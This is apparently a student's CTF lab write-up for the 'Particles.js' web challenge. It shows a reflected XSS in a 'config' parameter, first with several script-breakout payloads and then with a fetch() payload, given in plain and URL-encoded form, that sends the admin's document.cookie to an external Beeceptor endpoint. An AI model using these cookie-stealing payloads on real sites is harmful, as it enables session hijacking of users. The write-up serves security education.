# Simple Web - 0x08(Lab - `Particles.js`)
###### tags: `CTF` `Web` `eductf`
Challenge: https://particles.ctf.zoolab.org

## Description
The website can change the theme of layout. The main goal is to leak admin's cookie.

## Source Code

### Analysis

## Exploit - XSS
1. Use burp suit to check if the website has XSS vulnerability.
![](https://i.imgur.com/eu4Qqrs.png)
2. Try to modify `config` parameter
Payload 1: `1;alert(123);console.log({x://\`
    :::spoiler Response 1
    ```javascript!
    ...
    <script>
        url.value = location; config.value = '1;
        alert(123);
        console.log({x://\'; fetch('/1;alert(123);console.log({x://\.json').then(r => r.json()).then(json => {
            particlesJS("particles-js", json)
        })
    </script>
    ...
    ```
    :::
    or
    Payload 2: `</script><script>alert(123);</script>`
    :::spoiler Response 2
    ```javascript!
    ...
    <script>
    url.value = location; config.value = '
    </script>
    <script>
        alert(123);
    </script>
    '; fetch('/</script>
    <script>
        alert(123);
    </script>
    .json').then(r => r.json()).then(json => {
            particlesJS("particles-js", json)
        })
    </script>
    ...
    ```
    :::
    or 
    Payload 3: `</script><script>alert(123);</script><script>console.log({x://`
    :::spoiler Response 3
    ```javascript!
    ...
    <script>
    url.value = location; config.value = '
    </script>
    <script>
        alert(123);
    </script>
    <script>
        console.log({x://'; fetch('/
    </script>
    <script>   
        alert(123);
    </script>
    <script>
        console.log({x://.json').then(r => r.json()).then(json => {
            particlesJS("particles-js", json)
        })
    </script>
    ...
    ```
    :::
    ![](https://i.imgur.com/yDcnYv8.png)
3. `fetch` + [`Beeceptor`](https://beeceptor.com/)
Payload: 
    ```javascript!
    </script><script>fetch(%22https://sbk6401.free.beeceptor.com?%22%2bdocument.cookie);</script>
    ```
    **<font color="FF0000">Note that:</font>** MUST TRANSFER `+` AND `"` TO `%2B` AND `%22` RESPECTIVELY
    URL: 
    ```!
    https://particles.ctf.zoolab.org/?config=%3C/script%3E%3Cscript%3Efetch(%22https://sbkkk.free.beeceptor.com?%22%2bdocument.cookie);%3C/script%3E
    ```
    ![](https://i.imgur.com/VIPx7bb.png)

4. Report to author
Must encoded by [`URL encode`](https://www.urlencoder.org/)
Payload:
    ```!
    https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbkkk.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E
    ```
    ![](https://i.imgur.com/HMhXfGN.png)
    ![](https://i.imgur.com/1qNlp1t.png)

* Other payload:
    :::spoiler payload
    Payload 2
    ```!
    url=https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbk6401.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E%3Cscript%3Econsole.log%28%7Bx%3A%2F%2F
    ```
    Payload 3
    ```!
    url=https%3A%2F%2Fparticles.ctf.zoolab.org%2F%3Fconfig%3D%3C%2Fscript%3E%3Cscript%3Efetch%28%2522https%3A%2F%2Fsbk6401.free.beeceptor.com%3F%2522%252bdocument.cookie%29%3B%3C%2Fscript%3E
    ```
    :::